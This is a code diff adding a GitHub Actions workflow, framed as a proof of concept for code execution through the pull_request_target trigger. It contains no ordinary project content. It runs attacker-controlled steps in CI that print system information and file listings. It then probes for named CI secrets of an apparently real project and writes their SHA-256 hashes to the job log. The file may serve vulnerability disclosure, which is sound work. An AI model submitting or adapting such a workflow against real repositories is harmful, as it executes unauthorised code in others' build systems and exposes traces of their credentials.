@@ -1,0 +1,36 @@
+name: PoC – pull_request_target RCE Demo
+
+on:
+  pull_request_target:   # ⚠️ Dangerous with untrusted PRs
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Confirm attacker-controlled execution
+        run: |
+          echo "✅ Attacker-controlled code is running!"
+          echo "Actor: ${{ github.actor }}"
+          echo "Repository: ${{ github.repository }}"
+          echo "Event: ${{ github.event_name }}"
+
+      - name: Show system information (RCE proof)
+        run: |
+          echo "=== SYSTEM INFO ==="
+          date
+          uname -a
+          pwd
+          ls -lah
+          echo "=== END SYSTEM INFO ==="
+
+      - name: Check for injected secrets (safe)
+        run: |
+          echo "=== SECRET CHECK ==="
+          for s in ENVOY_CI_APP_KEY ENVOY_CI_APP_ID ENVOY_CI_MUTEX_APP_KEY ENVOY_CI_MUTEX_APP_ID GCS_CACHE_WRITE_KEY; do
+            if [ -n "${!s}" ]; then
+              echo "$s=present, hash=$(echo -n ${!s} | sha256sum | cut -d' ' -f1)"
+            else
+              echo "$s=not found"
+            fi
+          done
+          echo "=== END SECRET CHECK ==="
